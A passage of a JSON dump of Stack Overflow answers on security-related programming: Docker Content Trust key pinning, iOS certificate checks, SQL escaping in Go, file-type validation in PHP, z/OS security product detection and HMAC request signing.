        "body": "##\n# first, install docker\n##\nroot@disp2716:~# apt-get install docker.io\n...\nroot@disp2716:~#\n##\n# confirm that there is no docker config dir yet\n##\nroot@disp2716:~# ls -lah /root/.docker\nls: cannot access '/root/.docker': No such file or directory\nroot@disp2716:~#\n##\n# add the debian publisher's root DCT key\n##\nroot@disp2716:~# mkdir -p /root/.docker/trust/tuf/docker.io/library/debian/metadata\nroot@disp2716:~# chown -R root:root /root/.docker\nroot@disp2716:~# chmod -R 0700 /root/.docker\nroot@disp2716:~# echo '{\"signed\":{\"_type\":\"Root\",\"consistent_snapshot\":false,\"expires\":\"2025-08-07T20:55:22.677722315-07:00\",\"keys\":{\"5717dcd81d9fb5b73aa15f2d887a6a0de543829ab9b2d411acce9219c2f8ba3a\":{\"keytype\":\"ecdsa\",\"keyval\":{\"private\":null,\"public\":\"MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEsslGF2xHOYztrocb2OsRF2zth16v170QiLAyKdce1nQgOJ34FOk679ClPL9/RNnJukf2JfQXSlVV/qcsvxV2dQ==\"}},\"575d013f89e3cbbb19e0fb06aa33566c22718318e0c9ffb1ab5cc4291e07bf84\":{\"keytype\":\"ecdsa-x509\",\"keyval\":{\"private\":null,\"public\":\"LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJlVENDQVIrZ0F3SUJBZ0lRWExkUFFHTGJaOE84UXFlTzVuZlBRekFLQmdncWhrak9QUVFEQWpBak1TRXcKSHdZRFZRUURFeGhrYjJOclpYSXVhVzh2YkdsaWNtRnllUzlrWldKcFlXNHdIaGNOTVRVd09ERXhNRE0xTlRJeQpXaGNOTWpVd09EQTRNRE0xTlRJeVdqQWpNU0V3SHdZRFZRUURFeGhrYjJOclpYSXVhVzh2YkdsaWNtRnllUzlrClpXSnBZVzR3V1RBVEJnY3Foa2pPUFFJQkJnZ3Foa2pPUFFNQkJ3TkNBQVE1ZGkxcmxPQjBMQmRNS2N0VFQxYmwKUGd6aXYxOUJDdW9tNEFNL3BUdURtdjBnS0E5S1ptNUVjLy9VQmhSODVCYmR0cTk0cXhQM3IwUjhRc3FQV1Y4SQpvelV3TXpBT0JnTlZIUThCQWY4RUJBTUNBS0F3RXdZRFZSMGxCQXd3Q2dZSUt3WUJCUVVIQXdNd0RBWURWUjBUCkFRSC9CQUl3QURBS0JnZ3Foa2pPUFFRREFnTklBREJGQWlBOUFOZ3dPN2tBdUVIK3U2N25XNlFLWmlMdWd5UVcKaEQ3Vys5WjIza01mTndJaEFJa3RTaW1TdFdRQkFoOG9WOXhjaWNVWWVUN0pyUG82a0RqeHU1YitGZ3MxCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K\"}},\"728c96ff5e9f48d4e66d5a0c3ecabfdd90bee2b5f9f80b950ed9c668db264a70\":{\"keytype\":\"ecdsa\",\"keyval\":{\"private\":null,\"public\":\"MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAENtpBkDJ2oYaAAVdOkP0A6J0XwUkYGuFRk+q8N4WCPu2VnNIuBJkatPCWdEtHfQ9nNYLeanWgG62/UmJnx3E2Yg==\"}},\"d48327d85f0490827db7c931eedb58d293e1da5fc425ea0cde3e6c13b397ad69\":{\"keytype\":\"ecdsa\",\"keyval\":{\"private\":null,\"public\":\"MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEwfs26T/cpjvNTXVJpK7Wv8oDOnNKL78AT3Y1QD356OIAggwPupX2LQjZU6CVzCjm+pkJIO4clu9Q2n540gKuzQ==\"}}},\"roles\":{\"root\":{\"keyids\":[\"575d013f89e3cbbb19e0fb06aa33566c22718318e0c9ffb1ab5cc4291e07bf84\"],\"threshold\":1},\"snapshot\":{\"keyids\":[\"d48327d85f0490827db7c931eedb58d293e1da5fc425ea0cde3e6c13b397ad69\"],\"threshold\":1},\"targets\":{\"keyids\":[\"5717dcd81d9fb5b73aa15f2d887a6a0de543829ab9b2d411acce9219c2f8ba3a\"],\"threshold\":1},\"timestamp\":{\"keyids\":[\"728c96ff5e9f48d4e66d5a0c3ecabfdd90bee2b5f9f80b950ed9c668db264a70\"],\"threshold\":1}},\"version\":1},\"signatures\":[{\"keyid\":\"575d013f89e3cbbb19e0fb06aa33566c22718318e0c9ffb1ab5cc4291e07bf84\",\"method\":\"ecdsa\",\"sig\":\"3WbX1VXN9E8LRmSG+E4SQlBUNqBNchhwAStWnRWLLyAOoFNBq5xmIgSO3UYYuKyJvL7kbMoONRbn5Vk2p2Wqrg==\"}]}' > /root/.docker/trust/tuf/docker.io/library/debian/metadata/root.json\nroot@disp2716:~#\nroot@disp2716:~# chown root:root /root/.docker/trust/tuf/docker.io/library/debian/metadata/root.json\nroot@disp2716:~# chmod 0600 /root/.docker/trust/tuf/docker.io/library/debian/metadata/root.json\nroot@disp2716:~#\n##\n# pull the docker image with DCT verification\n##\nroot@disp2716:~# export DOCKER_CONTENT_TRUST=1\nroot@disp2716:~# docker pull debian:stable-slim\nPull (1 of 1): debian:stable-slim@sha256:850a7ee21c49c99b0e5e06df21f898a0e64335ae84eb37d6f71abc1bf28f5632\nsha256:850a7ee21c49c99b0e5e06df21f898a0e64335ae84eb37d6f71abc1bf28f5632: Pulling from library/debian\n6e640006d1cd: Pull complete\nDigest: sha256:850a7ee21c49c99b0e5e06df21f898a0e64335ae84eb37d6f71abc1bf28f5632\nStatus: Downloaded newer image for debian@sha256:850a7ee21c49c99b0e5e06df21f898a0e64335ae84eb37d6f71abc1bf28f5632\nTagging debian@sha256:850a7ee21c49c99b0e5e06df21f898a0e64335ae84eb37d6f71abc1bf28f5632 as debian:stable-slim\nroot@disp2716:~#",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2024-03-21T22:14:47",
        "author": "Michael Altfield"
      },
      {
        "answer_id": 78203701,
        "body": "##\n# first, move the docker config dir out of the way\n##\nmv /root/.docker /root/.docker.bak\n##\n# add the debian publisher's root DCT key (note I just overwrote the first 8\n# characters of the actual key with \"INVALID/\")\n##\nroot@disp2716:~# mkdir -p /root/.docker/trust/tuf/docker.io/library/debian/metadata\nroot@disp2716:~# chown -R root:root /root/.docker\nroot@disp2716:~# chmod -R 0700 /root/.docker\nroot@disp2716:~# echo '{\"signed\":{\"_type\":\"Root\",\"consistent_snapshot\":false,\"expires\":\"2025-08-07T20:55:22.677722315-07:00\",\"keys\":{\"5717dcd81d9fb5b73aa15f2d887a6a0de543829ab9b2d411acce9219c2f8ba3a\":{\"keytype\":\"ecdsa\",\"keyval\":{\"private\":null,\"public\":\"INVALID/KoZIzj0CAQYIKoZIzj0DAQcDQgAEsslGF2xHOYztrocb2OsRF2zth16v170QiLAyKdce1nQgOJ34FOk679ClPL9/RNnJukf2JfQXSlVV/qcsvxV2dQ==\"}},\"575d013f89e3cbbb19e0fb06aa33566c22718318e0c9ffb1ab5cc4291e07bf84\":{\"keytype\":\"ecdsa-x509\",\"keyval\":{\"private\":null,\"public\":\"INVALID/RUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJlVENDQVIrZ0F3SUJBZ0lRWExkUFFHTGJaOE84UXFlTzVuZlBRekFLQmdncWhrak9QUVFEQWpBak1TRXcKSHdZRFZRUURFeGhrYjJOclpYSXVhVzh2YkdsaWNtRnllUzlrWldKcFlXNHdIaGNOTVRVd09ERXhNRE0xTlRJeQpXaGNOTWpVd09EQTRNRE0xTlRJeVdqQWpNU0V3SHdZRFZRUURFeGhrYjJOclpYSXVhVzh2YkdsaWNtRnllUzlrClpXSnBZVzR3V1RBVEJnY3Foa2pPUFFJQkJnZ3Foa2pPUFFNQkJ3TkNBQVE1ZGkxcmxPQjBMQmRNS2N0VFQxYmwKUGd6aXYxOUJDdW9tNEFNL3BUdURtdjBnS0E5S1ptNUVjLy9VQmhSODVCYmR0cTk0cXhQM3IwUjhRc3FQV1Y4SQpvelV3TXpBT0JnTlZIUThCQWY4RUJBTUNBS0F3RXdZRFZSMGxCQXd3Q2dZSUt3WUJCUVVIQXdNd0RBWURWUjBUCkFRSC9CQUl3QURBS0JnZ3Foa2pPUFFRREFnTklBREJGQWlBOUFOZ3dPN2tBdUVIK3U2N25XNlFLWmlMdWd5UVcKaEQ3Vys5WjIza01mTndJaEFJa3RTaW1TdFdRQkFoOG9WOXhjaWNVWWVUN0pyUG82a0RqeHU1YitGZ3MxCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K\"}},\"728c96ff5e9f48d4e66d5a0c3ecabfdd90bee2b5f9f80b950ed9c668db264a70\":{\"keytype\":\"ecdsa\",\"keyval\":{\"private\":null,\"public\":\"INVALID/KoZIzj0CAQYIKoZIzj0DAQcDQgAENtpBkDJ2oYaAAVdOkP0A6J0XwUkYGuFRk+q8N4WCPu2VnNIuBJkatPCWdEtHfQ9nNYLeanWgG62/UmJnx3E2Yg==\"}},\"d48327d85f0490827db7c931eedb58d293e1da5fc425ea0cde3e6c13b397ad69\":{\"keytype\":\"ecdsa\",\"keyval\":{\"private\":null,\"public\":\"INVALID/KoZIzj0CAQYIKoZIzj0DAQcDQgAEwfs26T/cpjvNTXVJpK7Wv8oDOnNKL78AT3Y1QD356OIAggwPupX2LQjZU6CVzCjm+pkJIO4clu9Q2n540gKuzQ==\"}}},\"roles\":{\"root\":{\"keyids\":[\"575d013f89e3cbbb19e0fb06aa33566c22718318e0c9ffb1ab5cc4291e07bf84\"],\"threshold\":1},\"snapshot\":{\"keyids\":[\"d48327d85f0490827db7c931eedb58d293e1da5fc425ea0cde3e6c13b397ad69\"],\"threshold\":1},\"targets\":{\"keyids\":[\"5717dcd81d9fb5b73aa15f2d887a6a0de543829ab9b2d411acce9219c2f8ba3a\"],\"threshold\":1},\"timestamp\":{\"keyids\":[\"728c96ff5e9f48d4e66d5a0c3ecabfdd90bee2b5f9f80b950ed9c668db264a70\"],\"threshold\":1}},\"version\":1},\"signatures\":[{\"keyid\":\"575d013f89e3cbbb19e0fb06aa33566c22718318e0c9ffb1ab5cc4291e07bf84\",\"method\":\"ecdsa\",\"sig\":\"3WbX1VXN9E8LRmSG+E4SQlBUNqBNchhwAStWnRWLLyAOoFNBq5xmIgSO3UYYuKyJvL7kbMoONRbn5Vk2p2Wqrg==\"}]}' > /root/.docker/trust/tuf/docker.io/library/debian/metadata/root.json\nroot@disp2716:~#\nroot@disp2716:~# chown root:root /root/.docker/trust/tuf/docker.io/library/debian/metadata/root.json\nroot@disp2716:~# chmod 0600 /root/.docker/trust/tuf/docker.io/library/debian/metadata/root.json\nroot@disp2716:~#\n##\n# pull the docker image with DCT verification\n##\nroot@disp2716:~# export DOCKER_CONTENT_TRUST=1\nroot@disp2716:~# docker pull debian:stable-slim\ncould not validate the path to a trusted root: unable to retrieve valid leaf certificates\nroot@disp2716:~#\nroot@disp2716:~# echo $?\n1\nroot@disp2716:~#",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2024-03-21T22:14:47",
        "author": "Michael Altfield"
      },
      {
        "answer_id": 78203701,
        "body": "sudo su -\nmkdir -p /root/.docker/trust/tuf/docker.io/library/debian/metadata\nchown -R root:root /root/.docker\nchmod -R 0700 /root/.docker\necho '{\"signed\":{\"_type\":\"Root\",\"consistent_snapshot\":false,\"expires\":\"2025-08-07T20:55:22.677722315-07:00\",\"keys\":{\"5717dcd81d9fb5b73aa15f2d887a6a0de543829ab9b2d411acce9219c2f8ba3a\":{\"keytype\":\"ecdsa\",\"keyval\":{\"private\":null,\"public\":\"MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEsslGF2xHOYztrocb2OsRF2zth16v170QiLAyKdce1nQgOJ34FOk679ClPL9/RNnJukf2JfQXSlVV/qcsvxV2dQ==\"}},\"575d013f89e3cbbb19e0fb06aa33566c22718318e0c9ffb1ab5cc4291e07bf84\":{\"keytype\":\"ecdsa-x509\",\"keyval\":{\"private\":null,\"public\":\"LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJlVENDQVIrZ0F3SUJBZ0lRWExkUFFHTGJaOE84UXFlTzVuZlBRekFLQmdncWhrak9QUVFEQWpBak1TRXcKSHdZRFZRUURFeGhrYjJOclpYSXVhVzh2YkdsaWNtRnllUzlrWldKcFlXNHdIaGNOTVRVd09ERXhNRE0xTlRJeQpXaGNOTWpVd09EQTRNRE0xTlRJeVdqQWpNU0V3SHdZRFZRUURFeGhrYjJOclpYSXVhVzh2YkdsaWNtRnllUzlrClpXSnBZVzR3V1RBVEJnY3Foa2pPUFFJQkJnZ3Foa2pPUFFNQkJ3TkNBQVE1ZGkxcmxPQjBMQmRNS2N0VFQxYmwKUGd6aXYxOUJDdW9tNEFNL3BUdURtdjBnS0E5S1ptNUVjLy9VQmhSODVCYmR0cTk0cXhQM3IwUjhRc3FQV1Y4SQpvelV3TXpBT0JnTlZIUThCQWY4RUJBTUNBS0F3RXdZRFZSMGxCQXd3Q2dZSUt3WUJCUVVIQXdNd0RBWURWUjBUCkFRSC9CQUl3QURBS0JnZ3Foa2pPUFFRREFnTklBREJGQWlBOUFOZ3dPN2tBdUVIK3U2N25XNlFLWmlMdWd5UVcKaEQ3Vys5WjIza01mTndJaEFJa3RTaW1TdFdRQkFoOG9WOXhjaWNVWWVUN0pyUG82a0RqeHU1YitGZ3MxCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K\"}},\"728c96ff5e9f48d4e66d5a0c3ecabfdd90bee2b5f9f80b950ed9c668db264a70\":{\"keytype\":\"ecdsa\",\"keyval\":{\"private\":null,\"public\":\"MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAENtpBkDJ2oYaAAVdOkP0A6J0XwUkYGuFRk+q8N4WCPu2VnNIuBJkatPCWdEtHfQ9nNYLeanWgG62/UmJnx3E2Yg==\"}},\"d48327d85f0490827db7c931eedb58d293e1da5fc425ea0cde3e6c13b397ad69\":{\"keytype\":\"ecdsa\",\"keyval\":{\"private\":null,\"public\":\"MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEwfs26T/cpjvNTXVJpK7Wv8oDOnNKL78AT3Y1QD356OIAggwPupX2LQjZU6CVzCjm+pkJIO4clu9Q2n540gKuzQ==\"}}},\"roles\":{\"root\":{\"keyids\":[\"575d013f89e3cbbb19e0fb06aa33566c22718318e0c9ffb1ab5cc4291e07bf84\"],\"threshold\":1},\"snapshot\":{\"keyids\":[\"d48327d85f0490827db7c931eedb58d293e1da5fc425ea0cde3e6c13b397ad69\"],\"threshold\":1},\"targets\":{\"keyids\":[\"5717dcd81d9fb5b73aa15f2d887a6a0de543829ab9b2d411acce9219c2f8ba3a\"],\"threshold\":1},\"timestamp\":{\"keyids\":[\"728c96ff5e9f48d4e66d5a0c3ecabfdd90bee2b5f9f80b950ed9c668db264a70\"],\"threshold\":1}},\"version\":1},\"signatures\":[{\"keyid\":\"575d013f89e3cbbb19e0fb06aa33566c22718318e0c9f\nfb1ab5cc4291e07bf84\",\"method\":\"ecdsa\",\"sig\":\"3WbX1VXN9E8LRmSG+E4SQlBUNqBNchhwAStWnRWLLyAOoFNBq5xmIgSO3UYYuKyJvL7kbMoONRbn5Vk2p2Wqrg==\"}]}' > /root/.docker/trust/tuf/docker.io/library/debian/metadata/root.json\nexport DOCKER_CONTENT_TRUST=1\ndocker pull debian:stable-slim",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2024-03-21T22:14:47",
        "author": "Michael Altfield"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/64737897/how-to-check-if-a-certificate-is-installed-and-trusted-on-ios",
    "title": "How to check if a Certificate is installed and trusted on iOS",
    "question_id": 64737897,
    "posted_date": "2020-11-08T07:12:28",
    "answers": [
      {
        "answer_id": 64821717,
        "body": "// Load cert\nguard let filePath = Bundle.main.path(forResource: \"your_cert\", ofType: \"crt\"),\n\t  let data = try? Data(contentsOf: URL(fileURLWithPath: filePath)),\n\t  let certificate = SecCertificateCreateWithData(nil, data as CFData)\nelse {\n\treturn\n}\n// Check\nvar secTrust: SecTrust?\nif SecTrustCreateWithCertificates(certificate, SecPolicyCreateBasicX509(), &secTrust) == errSecSuccess, let trust = secTrust {\n\tSecTrustEvaluateAsyncWithError(trust, .main) { trust, result, error in\n\t\tprint(\"Cert is\", result ? \"installed\" : \"not installed\")\n\t}\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2020-11-13T08:23:45",
        "author": "iUrii"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/60438557/how-to-safely-zero-and-release-all-memory-pages-used-by-an-android-app",
    "title": "How to Safely Zero and release all memory pages used by an Android App?",
    "question_id": 60438557,
    "posted_date": "2020-02-27T12:14:56",
    "answers": [
      {
        "answer_id": 60585692,
        "body": "`javascript\naddEventListener(\"fetch\", event => {\n    event.respondWith(fetchAndReplace(event.request));\n});\nasync function fetchAndReplace(request) {\n    const response = await fetch(request);\n    let type = response.headers.get(\"Content-Type\") || \"\";\n    if (!type.startsWith(\"application/\")) {\n        return response;\n    }\n    let newHeaders = new Headers(response.headers);\n    newHeaders.set('Clear-Site-Data', '\"cache\", \"cookies\",  \"storage\",\n    \"executionContexts\"');\n    return new Response(response.body, {\n        status: response.status,\n        statusText: response.statusText,\n        headers: newHeaders\n    });\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2020-03-08T04:20:17",
        "author": "intr0"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/60998790/symfony-5confirmation-message-after-logout",
    "title": "[Symfony 5]Confirmation message after logout",
    "question_id": 60998790,
    "posted_date": "2020-04-02T14:41:28",
    "answers": [
      {
        "answer_id": 66371409,
        "body": "namespace App\\EventListener;\nuse JetBrains\\PhpStorm\\NoReturn;\nuse Symfony\\Component\\HttpFoundation\\RedirectResponse;\nuse Symfony\\Component\\HttpFoundation\\Response;\nuse Symfony\\Component\\Security\\Http\\Event\\LogoutEvent;\nclass CustomLogoutListener\n{\n    /**\n     * @param LogoutEvent $logoutEvent\n     * @return void\n     */\n    #[NoReturn]\n    public function onSymfonyComponentSecurityHttpEventLogoutEvent(LogoutEvent $logoutEvent): void\n    {\n        $logoutEvent->setResponse(new RedirectResponse('https://where-you-want-to-redirect.com', Response::HTTP_MOVED_PERMANENTLY));\n    }\n}",
        "score": 14,
        "is_accepted": true,
        "creation_date": "2021-02-25T10:21:11",
        "author": "Sergiu"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/31647406/mysql-real-escape-string-equivalent-for-golang",
    "title": "mysql_real_escape_string equivalent for Golang",
    "question_id": 31647406,
    "posted_date": "2015-07-27T03:37:57",
    "answers": [
      {
        "answer_id": 35257216,
        "body": "func Escape(sql string) string {\n\tdest := make([]byte, 0, 2*len(sql))\n\tvar escape byte\n\tfor i := 0; i < len(sql); i++ {\n\t\tc := sql[i]\n\t\tescape = 0\n\t\tswitch c {\n\t\tcase 0: /* Must be escaped for 'mysql' */\n\t\t\tescape = '0'\n\t\t\tbreak\n\t\tcase '\\n': /* Must be escaped for logs */\n\t\t\tescape = 'n'\n\t\t\tbreak\n\t\tcase '\\r':\n\t\t\tescape = 'r'\n\t\t\tbreak\n\t\tcase '\\\\':\n\t\t\tescape = '\\\\'\n\t\t\tbreak\n\t\tcase '\\'':\n\t\t\tescape = '\\''\n\t\t\tbreak\n\t\tcase '\"': /* Better safe than sorry */\n\t\t\tescape = '\"'\n\t\t\tbreak\n\t\tcase '\\032': //\u5341\u8fdb\u523626,\u516b\u8fdb\u523632,\u5341\u516d\u8fdb\u52361a, /* This gives problems on Win32 */\n\t\t\tescape = 'Z'\n\t\t}\n\t\tif escape != 0 {\n\t\t\tdest = append(dest, '\\\\', escape)\n\t\t} else {\n\t\t\tdest = append(dest, c)\n\t\t}\n\t}\n\treturn string(dest)\n}",
        "score": 10,
        "is_accepted": false,
        "creation_date": "2016-02-07T13:18:05",
        "author": "Shadoweb"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/12249260/php-validate-base64-encoded-images",
    "title": "PHP Validate base64 encoded images",
    "question_id": 12249260,
    "posted_date": "2012-09-03T09:55:13",
    "answers": [
      {
        "answer_id": 62908843,
        "body": "$file = 'Your base64 file string';\n$file_data = base64_decode($file);\n$f = finfo_open();\n$mime_type = finfo_buffer($f, $file_data, FILEINFO_MIME_TYPE);\n$file_type = explode('/', $mime_type)[0];\n$extension = explode('/', $mime_type)[1];\necho $mime_type; // will output mimetype, f.ex. image/jpeg\necho $file_type; // will output file type, f.ex. image\necho $extension; // will output extension, f.ex. jpeg\n$acceptable_mimetypes = [\n    'application/pdf',\n    'image/jpeg',\n];\n// you can write any validator below, you can check a full mime type or just an extension or file type\nif (!in_array($mime_type, $acceptable_mimetypes)) {\n    throw new \\Exception('File mime type not acceptable');\n}\n// or example of checking just a type\nif ($file_type !== 'image') {\n    throw new \\Exception('File is not an image');\n}",
        "score": 9,
        "is_accepted": false,
        "creation_date": "2020-07-15T02:30:59",
        "author": "Karol Gasienica"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/76624585/on-z-os-how-do-i-determine-which-security-product-is-active-racf-acf2-or-top",
    "title": "On z/OS, how do I determine which security product is active (RACF, ACF2, or Top Secret) in C?",
    "question_id": 76624585,
    "posted_date": "2023-07-05T19:13:08",
    "answers": [
      {
        "answer_id": 76624586,
        "body": "#ifdef _LP64\n  #error \"This code is 31-bit addressing mode specific\"\n#endif\ntypedef struct {\n  char id[4];\n} CVTRAC;\ntypedef struct {\n  char unk[0x3E0];\n  CVTRAC* cvtrac;\n} CVT;\ntypedef struct {\n  char unk[0x10];\n  CVT* cvt;\n} PSA;\ntypedef enum {\n  SAFUnk=0,\n  RACF=1,\n  TopSecret=2,\n  ACF2=3\n} SAFProvider;\nstatic SAFProvider saf_provider()\n{\n  PSA* psa = (void*) 0;\n  char* id = psa->cvt->cvtrac->id;\n  if (!memcmp(id, \"RCVT\", 4)) {\n    return RACF;\n  } else if (!memcmp(id, \"RTSS\", 4)) {\n    return TopSecret;\n  } else if (!memcmp(id, \"ACF2\", 4)) {\n    return ACF2;\n  } else {\n    return SAFUnk;\n  }\n}",
        "score": 8,
        "is_accepted": false,
        "creation_date": "2023-07-05T19:13:08",
        "author": "mike"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/61030422/how-to-exclude-disable-react-developer-tools-in-production-build",
    "title": "How to exclude / disable React Developer Tools in Production build?",
    "question_id": 61030422,
    "posted_date": "2020-04-04T11:28:49",
    "answers": [
      {
        "answer_id": 61030423,
        "body": "// disableReactDevTools.ts\n// Declare the types if you're using TypeScript\n// Ignore this block if you're using JavaScript\ndeclare global {\n  interface Window {\n    __REACT_DEVTOOLS_GLOBAL_HOOK__: any;\n  }\n}\nexport function disableReactDevTools() {\n  // Check if the React Developer Tools global hook exists\n  if (typeof window.__REACT_DEVTOOLS_GLOBAL_HOOK__ !== \"object\") {\n    return;\n  }\n  for (const prop in window.__REACT_DEVTOOLS_GLOBAL_HOOK__) {\n    if (prop === \"renderers\") {\n      // initialise this with an empty `Map`,\n      // else it will throw an error in console\n      window.__REACT_DEVTOOLS_GLOBAL_HOOK__[prop] = new Map()\n    } else {\n      // Replace all of its properties with a no-op function or a null value\n      // depending on their types\n      window.__REACT_DEVTOOLS_GLOBAL_HOOK__[prop] =\n        typeof window.__REACT_DEVTOOLS_GLOBAL_HOOK__[prop] === \"function\"\n          ? () => {}\n          : null;\n    }\n  }\n}",
        "score": 10,
        "is_accepted": true,
        "creation_date": "2020-04-04T11:28:49",
        "author": "Pushkin"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/60768795/how-to-secure-rest-api-from-replay-attacks-with-parameter-manipulation",
    "title": "How to secure REST API from replay attacks with parameter manipulation?",
    "question_id": 60768795,
    "posted_date": "2020-03-20T01:00:54",
    "answers": [
      {
        "answer_id": 60773987,
        "body": "/**\n    * Compute an API request HMAC using the given request URL and authorization request header value.\n    *\n    * @param context the application context\n    * @param url the request URL\n    * @param authHeaderValue the value of the authorization request header\n    * @return the request HMAC\n    */\n   private fun calculateAPIRequestHMAC(url: URL, authHeaderValue: String): String {\n       val secret = HMAC_SECRET\n       var keySpec: SecretKeySpec\n       // Configure the request HMAC based on the demo stage\n       when (currentDemoStage) {\n           DemoStage.API_KEY_PROTECTION, DemoStage.APPROOV_APP_AUTH_PROTECTION -> {\n               throw IllegalStateException(\"calculateAPIRequestHMAC() not used in this demo stage\")\n           }\n           DemoStage.HMAC_STATIC_SECRET_PROTECTION -> {\n               // Just use the static secret to initialise the key spec for this demo stage\n               keySpec = SecretKeySpec(Base64.decode(secret, Base64.DEFAULT), \"HmacSHA256\")\n               Log.i(TAG, \"CALCULATE STATIC HMAC\")\n           }\n           DemoStage.HMAC_DYNAMIC_SECRET_PROTECTION -> {\n               Log.i(TAG, \"CALCULATE DYNAMIC HMAC\")\n               // Obfuscate the static secret to produce a dynamic secret to initialise the key\n               // spec for this demo stage\n               val obfuscatedSecretData = Base64.decode(secret, Base64.DEFAULT)\n               val shipFastAPIKeyData = loadShipFastAPIKey().toByteArray(Charsets.UTF_8)\n               for (i in 0 until minOf(obfuscatedSecretData.size, shipFastAPIKeyData.size)) {\n                   obfuscatedSecretData[i] = (obfuscatedSecretData[i].toInt() xor shipFastAPIKeyData[i].toInt()).toByte()\n               }\n               val obfuscatedSecret = Base64.encode(obfuscatedSecretData, Base64.DEFAULT)\n               keySpec = SecretKeySpec(Base64.decode(obfuscatedSecret, Base64.DEFAULT), \"HmacSHA256\")\n           }\n       }\n       Log.i(TAG, \"protocol: ${url.protocol}\")\n       Log.i(TAG, \"host: ${url.host}\")\n       Log.i(TAG, \"path: ${url.path}\")\n       Log.i(TAG, \"Authentication: $authHeaderValue\")\n       // Compute the request HMAC using the HMAC SHA-256 algorithm\n       val hmac = Mac.getInstance(\"HmacSHA256\")\n       hmac.init(keySpec)\n       hmac.update(url.protocol.toByteArray(Charsets.UTF_8))\n       hmac.update(url.host.toByteArray(Charsets.UTF_8))\n       hmac.update(url.path.toByteArray(Charsets.UTF_8))\n       hmac.update(authHeaderValue.toByteArray(Charsets.UTF_8))\n       return hmac.doFinal().toHex()\n   }",
        "score": 7,
        "is_accepted": false,
        "creation_date": "2020-03-20T08:18:04",
        "author": "Exadra37"
      },
      {
        "answer_id": 60773987,
        "body": "if (DEMO.CURRENT_STAGE == DEMO.STAGES.HMAC_STATIC_SECRET_PROTECTION) {\n      // Just use the static secret during HMAC verification for this demo stage\n      hmac = crypto.createHmac('sha256', base64_decoded_hmac_secret)\n      log.info('---> VALIDATING STATIC HMAC <---')\n    } else if (DEMO.CURRENT_STAGE == DEMO.STAGES.HMAC_DYNAMIC_SECRET_PROTECTION) {\n      log.info('---> VALIDATING DYNAMIC HMAC <---')\n      // Obfuscate the static secret to produce a dynamic secret to use during HMAC\n      // verification for this demo stage\n      let obfuscatedSecretData = base64_decoded_hmac_secret\n      let shipFastAPIKeyData = new Buffer(config.SHIPFAST_API_KEY)\n      for (let i = 0; i < Math.min(obfuscatedSecretData.length, shipFastAPIKeyData.length); i++) {\n        obfuscatedSecretData[i] ^= shipFastAPIKeyData[i]\n      }\n      let obfuscatedSecret = new Buffer(obfuscatedSecretData).toString('base64')\n      hmac = crypto.createHmac('sha256', Buffer.from(obfuscatedSecret, 'base64'))\n    }\n    let requestProtocol\n    if (config.SHIPFAST_SERVER_BEHIND_PROXY) {\n      requestProtocol = req.get(config.SHIPFAST_REQUEST_PROXY_PROTOCOL_HEADER)\n    } else {\n      requestProtocol = req.protocol\n    }\n    log.info(\"protocol: \" + requestProtocol)\n    log.info(\"host: \" + req.hostname)\n    log.info(\"originalUrl: \" + req.originalUrl)\n    log.info(\"Authorization: \" + req.get('Authorization'))\n    // Compute the request HMAC using the HMAC SHA-256 algorithm\n    hmac.update(requestProtocol)\n    hmac.update(req.hostname)\n    hmac.update(req.originalUrl)\n    hmac.update(req.get('Authorization'))\n    let ourShipFastHMAC = hmac.digest('hex')\n    // Check to see if our HMAC matches the one sent in the request header\n    // and send an error response if it doesn't\n    if (ourShipFastHMAC != requestShipFastHMAC) {\n      log.error(\"\\tShipFast HMAC invalid: received \" + requestShipFastHMAC\n        + \" but should be \" + ourShipFastHMAC)\n      res.status(403).send()\n      return\n    }\n    log.success(\"\\nValid HMAC.\")",
        "score": 7,
        "is_accepted": false,
        "creation_date": "2020-03-20T08:18:04",
        "author": "Exadra37"
      },
      {
        "answer_id": 60773987,
        "body": "function computeHMAC(url, idToken) {\n    if (currentDemoStage == DEMO_STAGE.HMAC_STATIC_SECRET_PROTECTION\n            || currentDemoStage == DEMO_STAGE.HMAC_DYNAMIC_SECRET_PROTECTION)  {\n        var hmacSecret\n        if (currentDemoStage == DEMO_STAGE.HMAC_STATIC_SECRET_PROTECTION) {\n            // Just use the static secret in the HMAC for this demo stage\n            hmacSecret = HMAC_SECRET\n        }\n        else if (currentDemoStage == DEMO_STAGE.HMAC_DYNAMIC_SECRET_PROTECTION) {\n            // Obfuscate the static secret to produce a dynamic secret to\n            // use in the HMAC for this demo stage\n            var staticSecret = HMAC_SECRET\n            var dynamicSecret = CryptoJS.enc.Base64.parse(staticSecret)\n            var shipFastAPIKey = CryptoJS.enc.Utf8.parse($(\"#shipfast-api-key-input\").val())\n            for (var i = 0; i < Math.min(dynamicSecret.words.length, shipFastAPIKey.words.length); i++) {\n                dynamicSecret.words[i] ^= shipFastAPIKey.words[i]\n            }\n            dynamicSecret = CryptoJS.enc.Base64.stringify(dynamicSecret)\n            hmacSecret = dynamicSecret\n        }\n        if (hmacSecret) {\n            var parser = document.createElement('a')\n            parser.href = url\n            var msg = parser.protocol.substring(0, parser.protocol.length - 1)\n                + parser.hostname + parser.pathname + idToken\n            var hmac = 